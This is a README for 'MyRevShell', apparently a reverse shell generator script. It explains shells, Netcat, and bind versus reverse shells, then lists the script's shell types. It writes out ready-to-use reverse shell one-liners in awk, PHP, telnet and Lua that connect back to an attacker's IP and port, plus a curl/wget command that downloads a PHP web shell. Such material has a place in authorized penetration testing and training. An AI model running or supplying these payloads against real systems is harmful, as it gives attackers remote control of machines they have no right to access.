# What is a Shell?
> - Shell is a program whose function is to provide an interface for users of an operating system to access kernel services. 
> - In general, operating system shells use either a command line interface (CLI) or a graphical user interface (GUI). 
> - It's called a shell because it's the outermost layer around the operating system. 
> #### More information: [Wikipedia-Shell](https://en.wikipedia.org/wiki/Shell_%28computing%29)
---

# What is Netcat? 
> - Considered the Swiss army knife of TCP/IP, Netcat is a networking tool used to read and write data over the network using TCP or UDP protocols. 
> ### Types:
> - [Ncat](https://nmap.org/ncat/)
> - [The GNU Netcat](https://netcat.sourceforge.net/)
> - [Netcat Tradicional](https://packages.debian.org/sid/netcat-traditional)
> - [Netcat OpenBSD](https://packages.debian.org/sid/netcat-openbsd)
> - [Netcat6](http://www.deepspace6.net/projects/netcat6.html)
> - [Socat](http://www.dest-unreach.org/socat/)
> #### More information: [Wikipedia-Netcat](https://en.wikipedia.org/wiki/Netcat)
---

# Reverse Shell and Bind Shell
> ### Bind Shell: 
> - Have the listener running on the target and the attacker connects to the listener to get a remote shell. 
> - The attacker must know the IP address of the victim before launching the Bind Shell. 
> - Bind Shell sometimes will fail, because modern firewalls don’t allow outsiders to connect to open ports.
> ### Reverse Shell:
> - Have the listener running on the attacker and the target connects to the attacker with a shell.
> - The attacker doesn’t need to know the IP address of the victim, because the attacker is going to connect to our open port.
> - Reverse Shell can bypass the firewall issues because this target machine tries to connect to the attacker, so the firewall doesn’t bother checking packets.
---

# MyRevShell
> The script has 16 shell generator options + 1 base64 encode option 
> ### Types:
> - "sh"
> - "zsh"
> - "bash"
> - "nc -c"
> - "nc -e"
> - "nc.exe -e"
> - "nc mkfifo"
> - "ncat -e"
> - "ncat.exe -e"
> - "python x1"
> - "python x2"
> - "python3 x1"
> - "python3 x2"
> - "python3 shortest"
> - "socat x1"
> - "socat x2"
> #### Extra:
> - Awk Shell:
> ``` 
> awk 'BEGIN {s = "/inet/tcp/0/#ip/#port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } > } while(c != "exit") close(s); }}' /dev/null
> ```
> - PHP exec: 
> ```
> php -r '$sock=fsockopen("#ip",#port);exec("bash <&3 >&3 2>&3");'
> ```
> - Telnet:
> ```
> TF=$(mktemp -u);mkfifo $TF && telnet #ip #port 0<$TF | bash 1>$TF
> ```
> - Lua:
> ```
> lua -e "require('socket');require('os');t=socket.tcp();t:connect('#ip','#port');os.execute('bash -i <&3 >&3 2>&3');"
> ```
> ### Web Shell: 
> Download: 
> - **Curl/Wget: `curl/wget https://raw.githubusercontent.com/h0ru/My-Shell/main/shell.php -O shell.php`**
---
